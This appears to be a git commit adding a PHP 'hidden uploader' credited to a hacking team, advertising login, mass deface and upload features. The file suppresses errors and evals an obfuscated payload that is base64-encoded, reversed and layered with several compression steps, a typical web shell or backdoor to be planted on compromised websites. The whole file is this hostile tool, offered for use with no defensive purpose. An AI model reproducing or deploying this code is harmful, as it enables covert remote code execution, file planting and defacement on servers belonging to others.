073b181fdb10b92310c9ef7a3b5d53b18e8fb498
Mr-Zero076 <72953539+Mr-Zero076@users.noreply.github.com>
2020-11-13 18:33:42 +0700

    Add files via upload

---
+++ Create Uploaders.php
@@ -0,0 +1,25 @@
+<?php
+#######################################
+# AUTHOR : Mr-Zero076 [Abdul]         #
+# TEAM: PURWAKARTA CYBER              #
+# THEME: HIDDEN UPLOADERS WITH LOGIN  #
+# FITURE: LOGOUT, MASS DEFACE, UPLOAD #
+#######################################
+# EXAMPLE: http://web.com?black=up    #
+#######################################
+# COPYRIGHT © 2K20 BLACK CODERS       #
+#######################################
+
+session_start();
+@error_reporting(0);
+@set_time_limit(0);
+$x = "4c25b32a72699ed712dfa80df77fc582"; // jhon
+?>
+
+<?php
+$anonghostteam = "ZXZhbCgiPz4iLmd6dW5jb21wcmVzcyhnenVuY29tcHJlc3MoZ3ppbmZsYXRlKGd6aW5mbGF0ZShnemluZmxhdGUoYmFzZTY0X2RlY29kZShzdHJyZXYoJGFub25naG9zdCkpKSkpKSkpOw==";
+
+$anonghost = "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";
+eval(htmlspecialchars_decode(urldecode(base64_decode($anonghostteam))));
+exit;
+?>
